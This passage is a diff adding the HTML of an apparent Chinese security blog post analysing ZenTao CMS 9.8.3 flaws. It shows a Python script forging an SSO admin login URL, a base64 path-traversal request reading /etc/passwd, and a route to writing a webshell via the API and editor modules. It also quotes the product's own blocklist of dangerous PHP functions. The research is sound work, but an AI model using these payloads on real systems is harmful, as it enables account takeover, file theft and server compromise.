@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        禅道cms几处漏洞分析 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0"><span class="toc-text">2.1  登陆后台</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-1-%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">2.1.1 后台弱口令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-2-9-2-1%E7%89%88%E6%9C%AC%E4%B8%80%E5%A4%84%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5"><span class="toc-text">2.1.2 9.2.1版本一处前台注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-3-sso%E5%8D%95%E7%82%B9%E7%99%BB%E9%99%86"><span class="toc-text">2.1.3 sso单点登陆</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">2.2 任意文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-GetShell"><span class="toc-text">2.3 GetShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x04 参考文章</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        禅道cms几处漏洞分析
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-07-02 14:30:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#php" title="php">php</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#禅道" title="禅道">禅道</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>平时不好好学习的结果就是到学期末所有的事情都堆到一起，上博客一看，又将近两个月没更新了，抓紧出两篇刷刷存在感。。。近期跟禅道这个cms打了几次交道，从中学到了几个很骚的思路，在这里记录一下。</p>
+<span id="more"></span>
+
+
+<h3 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h3><p>测试环境使用当前开源版的最新版本9.8.3：<a target="_blank" rel="noopener" href="http://www.zentao.net/download/80072.html">http://www.zentao.net/download/80072.html</a></p>
+<h4 id="2-1-登陆后台"><a href="#2-1-登陆后台" class="headerlink" title="2.1  登陆后台"></a>2.1  登陆后台</h4><p>由于禅道几乎所有的操作都需要登陆后台，所以我们第一步就是要获取后台权限，这里有几个方法。</p>
+<h5 id="2-1-1-后台弱口令"><a href="#2-1-1-后台弱口令" class="headerlink" title="2.1.1 后台弱口令"></a>2.1.1 后台弱口令</h5><p>禅道后台管理员admin的密码默认为123456，但是登陆后台后如果检测到密码强度过低的话，所有页面都会重定向到改密码的页面，强制修改密码，否则无法进行其他操作。</p>
+<h5 id="2-1-2-9-2-1版本一处前台注入"><a href="#2-1-2-9-2-1版本一处前台注入" class="headerlink" title="2.1.2 9.2.1版本一处前台注入"></a>2.1.2 9.2.1版本一处前台注入</h5><p>柠檬师傅的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/chandao_pentest_1.html">详细分析</a>在这里，不班门弄斧了。</p>
+<h5 id="2-1-3-sso单点登陆"><a href="#2-1-3-sso单点登陆" class="headerlink" title="2.1.3 sso单点登陆"></a>2.1.3 sso单点登陆</h5><p>这是比较骚的一个思路，可以不用登陆直接获取admin权限。</p>
+<p><code>module/sso/control.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$type</span> = <span class="string">&#x27;notify&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$referer</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;referer&#x27;</span>]) ? <span class="string">&#x27;&#x27;</span> : <span class="variable language_">$this</span>-&gt;get-&gt;referer;</span><br><span class="line">        <span class="variable">$locate</span>  = <span class="keyword">empty</span>(<span class="variable">$referer</span>) ? <span class="title function_ invoke__">getWebRoot</span>() : <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$referer</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">loadConfig</span>(<span class="string">&#x27;sso&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;config-&gt;sso-&gt;turnon) <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">locate</span>(<span class="variable">$locate</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userIP</span> = <span class="variable language_">$this</span>-&gt;server-&gt;remote_addr;  <span class="comment">//用户ip</span></span><br><span class="line">        <span class="variable">$code</span>   = <span class="variable language_">$this</span>-&gt;config-&gt;sso-&gt;code; <span class="comment">//数据库中获取</span></span><br><span class="line">        <span class="variable">$key</span>    = <span class="variable language_">$this</span>-&gt;config-&gt;sso-&gt;key; <span class="comment">//数据库中获取</span></span><br><span class="line">        <span class="comment">/*省略部分*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;get-&gt;status == <span class="string">&#x27;success&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;get-&gt;data) == <span class="variable language_">$this</span>-&gt;get-&gt;md5)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$last</span> = <span class="variable language_">$this</span>-&gt;server-&gt;request_time;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;get-&gt;data));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$token</span> = <span class="variable">$data</span>-&gt;token;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;auth == <span class="title function_ invoke__">md5</span>(<span class="variable">$code</span> . <span class="variable">$userIP</span> . <span class="variable">$token</span> . <span class="variable">$key</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;sso-&gt;<span class="title function_ invoke__">getBindUser</span>(<span class="variable">$data</span>-&gt;account);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="variable">$user</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;ssoData&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">locate</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">createLink</span>(<span class="string">&#x27;sso&#x27;</span>, <span class="string">&#x27;bind&#x27;</span>, <span class="string">&quot;referer=&quot;</span> . helper::<span class="title function_ invoke__">safe64Encode</span>(<span class="variable">$locate</span>)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadModel</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">isLogon</span>())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;session-&gt;user &amp;&amp; <span class="variable language_">$this</span>-&gt;session-&gt;user-&gt;account == <span class="variable">$user</span>-&gt;account) <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">locate</span>(<span class="variable">$locate</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;user-&gt;<span class="title function_ invoke__">cleanLocked</span>(<span class="variable">$user</span>-&gt;account);</span><br><span class="line">                <span class="comment">/* Authorize him and save to session.  这里是重点*/</span></span><br><span class="line">                <span class="comment">/*省略部分*/</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">locate</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">createLink</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;login&#x27;</span>, <span class="keyword">empty</span>(<span class="variable">$referer</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="string">&quot;referer=<span class="subst">$referer</span>&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有几步验证，一步一步看。</p>
+<ol>
+<li><p>需要status参数为success，并且data参数的md5值要与md5参数相同。</p>
+</li>
+<li><p>data进行base64解码和json_decode之后，auth需要与md5($code . $userIP . $token . $key)相同。</p>
+<p>这里code、key在数据库中，是一个默认值，一般不会修改。token是data的元素，可控。</p>
+</li>
+</ol>
+<p>接下来就是绑定用户，验证，把认证信息存入session。附上生成url的代码，会更直观一点。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">auth = md5(<span class="string">&#x27;T6C5mypd2ZchLK0vAN9oz4YqP&#x27;</span> + <span class="string">&#x27;192.168.250.1&#x27;</span> + <span class="string">&#x27;&#x27;</span> + <span class="string">&#x27;vyoQHt5r8MD6bPksSwGmcd3gz&#x27;</span>)</span><br><span class="line">data = base64.b64encode(json.dumps(&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;auth&quot;</span>:auth,<span class="string">&quot;account&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;))</span><br><span class="line">login_url = <span class="string">&#x27;http://192.168.250.133:8000/www/index.php?m=sso&amp;f=login&amp;type=return&amp;aHR0cDovL2hhY2tlZC5sb2wv&amp;data=%s&amp;status=success&amp;md5=%s&amp;&#x27;</span> % (data, md5(data))</span><br><span class="line"><span class="built_in">print</span>(login_url)</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-任意文件读取"><a href="#2-2-任意文件读取" class="headerlink" title="2.2 任意文件读取"></a>2.2 任意文件读取</h4><p><code>module/editor/control.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"><span class="variable">$filePath</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$action</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$isExtends</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;view-&gt;safeFilePath = <span class="variable">$filePath</span>;</span><br><span class="line">    <span class="variable">$fileContent</span>  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filePath</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$filePath</span> = helper::<span class="title function_ invoke__">safe64Decode</span>(<span class="variable">$filePath</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$filePath</span>), <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getBasePath</span>())) !== <span class="number">0</span>) <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;lang-&gt;editor-&gt;editFileError);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;extendOther&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filePath</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;view-&gt;showContent = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filePath</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;edit&#x27;</span> <span class="keyword">or</span> <span class="variable">$action</span> == <span class="string">&#x27;override&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filePath</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filePath</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;override&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$fileContent</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../../&#x27;</span>, <span class="string">&#x27;../../../&#x27;</span>, <span class="variable">$fileContent</span>);</span><br><span class="line">                    <span class="variable">$fileContent</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;\&#x27;./&#x27;</span>, <span class="string">&#x27;&quot;./&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;../../view/&#x27;</span>, <span class="string">&#x27;&quot;../../view&#x27;</span>), <span class="variable">$fileContent</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$filePath</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*省略*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;view-&gt;fileContent = <span class="variable">$fileContent</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;view-&gt;filePath    = <span class="variable">$filePath</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;view-&gt;action      = <span class="variable">$action</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先将filePath进行base64解码，然后做了一个判断。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$filePath</span>), <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getBasePath</span>())) !== <span class="number">0</span>) <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;lang-&gt;editor-&gt;editFileError);</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$this-&gt;app-&gt;getBasePath()</code>就是程序的根目录，如何获取到呢？</p>
+<p>只要访问<code>index.php?m=editor&amp;f=edit</code>，输入任意内容然后保存，弹出的警告就会暴露根目录。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180702/4d04i968kg.png" alt="mark"></p>
+<p>我们只要保证filePath里有程序的根目录,比如这里的<code>/opt/zbox/app/zentao</code>，然后再用<code>../</code>跳出来即可。</p>
+<p>之后就没有任何过滤了，访问<code>http://192.168.250.133:8000/zentao/index.php?m=editor&amp;f=edit&amp;filePath=L29wdC96Ym94L2FwcC96ZW50YW8vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==&amp;action=edit</code></p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180702/GBC0iH3mc7.png" alt="mark"></p>
+<h4 id="2-3-GetShell"><a href="#2-3-GetShell" class="headerlink" title="2.3 GetShell"></a>2.3 GetShell</h4><p><code>module/api/control.php </code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"><span class="variable">$moduleName</span>, <span class="variable">$methodName</span>, <span class="variable">$params</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$params</span>    = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$params</span>);</span><br><span class="line">    <span class="variable">$newParams</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$params</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$param</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$param</span>, <span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span> ? <span class="string">&#x27;&amp;&#x27;</span> : <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">        <span class="variable">$newParams</span> .= <span class="variable">$sign</span> . <span class="variable">$param</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$newParams</span>, <span class="variable">$params</span>);</span><br><span class="line">    <span class="variable">$module</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadModel</span>(<span class="variable">$moduleName</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(&amp;<span class="variable">$module</span>, <span class="variable">$methodName</span>), <span class="variable">$params</span>);</span><br><span class="line">    <span class="keyword">if</span>(dao::<span class="title function_ invoke__">isError</span>()) <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(dao::<span class="title function_ invoke__">getError</span>()));</span><br><span class="line">    <span class="variable">$output</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$result</span> ? <span class="string">&#x27;success&#x27;</span> : <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">    <span class="variable">$output</span>[<span class="string">&#x27;data&#x27;</span>]   = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="variable">$output</span>[<span class="string">&#x27;md5&#x27;</span>]    = <span class="title function_ invoke__">md5</span>(<span class="variable">$output</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;output     = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用了call_user_func_array函数，模块、方法、参数都是可控的，接下的任务就是找一个可以写文件的函数。</p>
+<p><code>module/editor/model.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$filePath</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fileContent</span> = <span class="variable language_">$this</span>-&gt;post-&gt;fileContent;</span><br><span class="line">    <span class="variable">$evils</span>       = <span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;$$&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">    <span class="variable">$gibbedEvils</span> = <span class="keyword">array</span>(<span class="string">&#x27;e v a l&#x27;</span>, <span class="string">&#x27;e x e c&#x27;</span>, <span class="string">&#x27; p a s s t h r u&#x27;</span>, <span class="string">&#x27; p r o c _ o p e n&#x27;</span>, <span class="string">&#x27;s h e l l _ e x e c&#x27;</span>, <span class="string">&#x27;s y s t e m&#x27;</span>, <span class="string">&#x27;$ $&#x27;</span>, <span class="string">&#x27;i n c l u d e&#x27;</span>, <span class="string">&#x27;r e q u i r e&#x27;</span>, <span class="string">&#x27;a s s e r t&#x27;</span>);</span><br><span class="line">    <span class="variable">$fileContent</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$gibbedEvils</span>, <span class="variable">$evils</span>, <span class="variable">$fileContent</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">get_magic_quotes_gpc</span>()) <span class="variable">$fileContent</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$fileContent</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dirPath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    <span class="variable">$extFilePath</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filePath</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$filePath</span>, DS . <span class="string">&#x27;ext&#x27;</span> . DS) + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dirPath</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_writable</span>(<span class="variable">$extFilePath</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dirPath</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_writable</span>(<span class="variable">$dirPath</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filePath</span>, <span class="variable">$fileContent</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(js::<span class="title function_ invoke__">alert</span>(<span class="variable">$this</span>-&gt;lang-&gt;editor-&gt;notWritable . <span class="variable">$extFilePath</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 可以看到这里做了一些过滤，但是并不影响写shell。</p>
+<p>这里有几个可写目录，一个是<code>zentao/tmp</code>，还有一个<code>zentao/www/data</code>，有的网站会配置直接访问www目录，上一级是访问不到的，所以最好将shell写入data或者其子目录中。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180702/7dgDb5diH1.png" alt="mark"></p>
+<h3 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/chandao_pentest_1.html">从SQL注入到Getshell：记一次禅道系统的渗透</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
